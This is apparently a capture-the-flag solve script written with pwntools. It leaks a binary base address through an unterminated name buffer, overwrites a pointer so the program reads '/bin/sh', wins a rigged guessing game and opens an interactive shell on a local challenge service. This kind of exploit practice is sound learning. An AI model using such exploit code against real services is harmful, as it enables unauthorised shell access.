# solve script written by joseph

from pwn import *

conn = remote('0.0.0.0', 1337)

# fill the NAME buffer all the way so strlen catches the
# adjacent RANDBUF bytes
conn.sendafter('?\n', 'A'*32)

# leak a binary address by reading the NAME
conn.sendlineafter('> ', '2')
bin_base = u64(conn.recvline()[32:-1].ljust(8, b'\x00')) - 0x2024
log.success('binary base: ' + hex(bin_base))

NAME = bin_base + 0x40a0

# overwrite RANDBUF with a pointer to NAME, and write /bin/sh to
# name so the /bin/sh binary is read when we play the game
conn.sendlineafter('> ', '1')
conn.sendafter('?\n', b'/bin/sh\x00'.ljust(32, b'A') + p64(NAME)[:6])

# play game and easily win, since the "random" bytes are just the
# first four bytes of the ELF header
conn.sendlineafter('> ', '1337')
conn.sendlineafter('guess: ', str(u32(b'\x7fELF')))

conn.interactive()
